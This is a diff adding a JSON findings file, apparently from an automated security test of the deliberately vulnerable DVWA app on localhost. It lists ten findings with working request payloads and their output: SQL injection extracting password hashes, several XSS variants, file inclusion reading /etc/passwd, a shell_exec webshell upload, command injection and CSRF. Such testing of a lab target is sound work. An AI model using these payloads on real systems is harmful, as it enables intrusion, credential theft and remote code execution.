@@ -1,0 +1,176 @@
+{
+  "run_id": "run-xrp4b-10081011",
+  "generated_at": "2026-10-08T10:30:00Z",
+  "findings": [
+    {
+      "id": "F-1",
+      "title": "SQL Injection (UNION) at /vulnerabilities/sqli/ extracts DB version and user password hashes",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /security.php",
+        "EXPECT user_token",
+        "POST /security.php --data security=low&seclev_submit=Submit&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%2Cversion()--%20&Submit=Submit",
+        "EXPECT 10.1.26-MariaDB",
+        "GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--%20&Submit=Submit",
+        "EXPECT 5f4dcc3b5aa765d61d8327deb882cf99"
+      ],
+      "expected": "Server returns DB version and MD5 password hashes for users via UNION-based SQLi.",
+      "observed": "UNION SELECT 1,version() returned 'Surname: 10.1.26-MariaDB-0+deb9u1'. UNION SELECT user,password FROM users returned 'admin'/'5f4dcc3b5aa765d61d8327deb882cf99' and 'smithy'/'5f4dcc3b5aa765d61d8327deb882cf99' (MD5 of 'password')."
+    },
+    {
+      "id": "F-2",
+      "title": "Blind SQL Injection (boolean) at /vulnerabilities/sqli_blind/ via SUBSTRING inference",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/sqli_blind/?id=1%27+AND+%271%27%3D%271&Submit=Submit",
+        "EXPECT User ID exists",
+        "GET /vulnerabilities/sqli_blind/?id=1%27+AND+%271%27%3D%272&Submit=Submit",
+        "EXPECT User ID is MISSING",
+        "GET /vulnerabilities/sqli_blind/?id=1%27+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+user%3D%27admin%27)%2C1%2C1)%3D%275%27--%20&Submit=Submit",
+        "EXPECT User ID exists"
+      ],
+      "expected": "Boolean-based blind SQLi allows character-by-character extraction of admin's password hash.",
+      "observed": "True condition (1' AND '1'='1) returns 'User ID exists'; false condition (1' AND '1'='2) returns 'User ID is MISSING'. First character probe of admin's password hash equals '5' (matches MD5('password') = 5f4dcc3b5aa765d61d8327deb882cf99)."
+    },
+    {
+      "id": "F-3",
+      "title": "Reflected XSS at /vulnerabilities/xss_r/ via 'name' parameter (no output encoding)",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "EXPECT <script>alert(1)</script>"
+      ],
+      "expected": "Reflected XSS — the 'name' parameter is echoed back into the response body without HTML encoding, allowing script injection in the attacker's session context.",
+      "observed": "Response body contains the literal substring '<script>alert(1)</script>' inside <pre>Hello <script>alert(1)</script></pre> — browser would execute the script on page load."
+    },
+    {
+      "id": "F-4",
+      "title": "Stored XSS at /vulnerabilities/xss_s/ via 'mtxMessage' guestbook field (persists across requests)",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/xss_s/",
+        "POST /vulnerabilities/xss_s/ --data txtName=testXSS&mtxMessage=%3Cscript%3Ealert(1)%3C%2Fscript%3E&btnSign=Sign+Guestbook",
+        "GET /vulnerabilities/xss_s/",
+        "EXPECT <script>alert(1)</script>"
+      ],
+      "expected": "Stored XSS — the guestbook entry persists and the script tag is rendered unencoded for any subsequent visitor.",
+      "observed": "After POSTing mtxMessage=<script>alert(1)</script>, a subsequent GET /vulnerabilities/xss_s/ contains the raw <script> tag in the guestbook table — executes in any visitor's browser."
+    },
+    {
+      "id": "F-5",
+      "title": "Local File Inclusion (LFI) at /vulnerabilities/fi/ via 'page' parameter; php://filter enables source disclosure",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/fi/?page=%2Fetc%2Fpasswd",
+        "EXPECT root:x:0:0:root",
+        "GET /vulnerabilities/fi/?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php",
+        "EXPECT PD9w"
+      ],
+      "expected": "LFI allows arbitrary local file read; php://filter wrapper discloses PHP source code (bypasses execution).",
+      "observed": "GET ?page=/etc/passwd returns 'root:x:0:0:root:/root:/bin/bash' from the system /etc/passwd. GET ?page=php://filter/convert.base64-encode/resource=index.php returns base64 that decodes to the raw source of index.php."
+    },
+    {
+      "id": "F-6",
+      "title": "Arbitrary File Upload leads to RCE at /vulnerabilities/upload/ (no extension/type filter; .php is web-executable)",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/upload/",
+        "POST /vulnerabilities/upload/ --data Upload=Upload&uploaded=PLACEHOLDER",
+        "GET /hackable/uploads/webshell.php?c=id",
+        "EXPECT uid=33(www-data)"
+      ],
+      "expected": "Uploading a .php file lands in a web-executable directory and yields remote code execution.",
+      "observed": "After uploading a PHP file with body '<?php echo shell_exec($_GET[\"c\"]); ?>', the server reported 'succesfully uploaded!'. A subsequent GET /hackable/uploads/webshell.php?c=id returned 'RCE-OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)'."
+    },
+    {
+      "id": "F-7",
+      "title": "OS Command Injection at /vulnerabilities/exec/ via 'ip' parameter (shell_exec with ;, |, &&)",
+      "severity": "critical",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "POST /vulnerabilities/exec/ --data ip=127.0.0.1%3Bid&Submit=Submit",
+        "EXPECT uid=33(www-data)",
+        "POST /vulnerabilities/exec/ --data ip=127.0.0.1%7Cid&Submit=Submit",
+        "EXPECT uid=33(www-data)"
+      ],
+      "expected": "OS command injection via shell metacharacters in the 'ip' parameter (passed unsanitized to shell_exec).",
+      "observed": "POST ip=127.0.0.1;id -> <pre> ... uid=33(www-data) gid=33(www-data) groups=33(www-data) </pre>. POST ip=127.0.0.1|id -> same 'uid=33(www-data)' output. The ';' and '|' separators both yield RCE as the www-data user."
+    },
+    {
+      "id": "F-8",
+      "title": "CSRF on admin password change at /vulnerabilities/csrf/ (no anti-CSRF token on form)",
+      "severity": "medium",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/csrf/",
+        "EXPECT password_new",
+        "POST /vulnerabilities/csrf/ --data password_new=pwned123&password_conf=pwned123&Change=Change",
+        "EXPECT Password Changed"
+      ],
+      "expected": "CSRF — the password-change form lacks an anti-CSRF token, so a cross-site form submission from the victim's browser will silently change admin's password.",
+      "observed": "GET /vulnerabilities/csrf/ exposes a form with only fields password_new, password_conf, Change (no user_token). A POST with matching new/confirm values changes the admin password without any further challenge."
+    },
+    {
+      "id": "F-9",
+      "title": "Weak authentication: default credentials admin/password accepted at /vulnerabilities/brute/ and DVWA login.php",
+      "severity": "high",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /vulnerabilities/brute/?username=admin&password=password&Login=Login",
+        "EXPECT Welcome to the password protected area",
+        "GET /vulnerabilities/brute/?username=admin&password=wrong&Login=Login",
+        "EXPECT Username and/or password incorrect"
+      ],
+      "expected": "Default credentials allow access; wrong credentials are clearly rejected (timing/response distinguishable, suitable for brute force).",
+      "observed": "GET /vulnerabilities/brute/?username=admin&password=password&Login=Login returns 'Welcome to the password protected area'. GET ...password=wrong returns 'Username and/or password incorrect.' The 'security=low' setting additionally makes the brute page's login query vulnerable to SQL injection (e.g., admin' -- )."
+    },
+    {
+      "id": "F-10",
+      "title": "DOM-based XSS at /vulnerabilities/xss_d/ via 'default' query parameter (document.write sink)",
+      "severity": "medium",
+      "target": "http://127.0.0.1",
+      "steps": [
+        "GET /login.php",
+        "EXPECT user_token",
+        "POST /login.php --data username=admin&password=password&Login=Login&user_token=PLACEHOLDER",
+        "GET /vulnerabilities/xss_d/",
+        "EXPECT document.location.href.indexOf(\"default=\")",
+        "GET /vulnerabilities/xss_d/?default=English",
+        "EXPECT <option"
+      ],
+      "expected": "DOM-based XSS — the 'default' URL parameter is extracted via document.location.href.substring and written into the DOM via document.write, allowing arbitrary script execution when the page is loaded with a crafted URL fragment.",
+      "observed": "Page source contains 'if (document.location.href.indexOf(\"default=\") >= 0) { var lang = document.location.href.substring(...+8); document.write(\"<option value='\" + decodeURI(lang) + \"'>\" + decodeURI(lang) + \"</option>\"... }'. The 'default' parameter value is reflected into a <select> option without server-side encoding, fully controllable client-side."
+    }
+  ]
+}
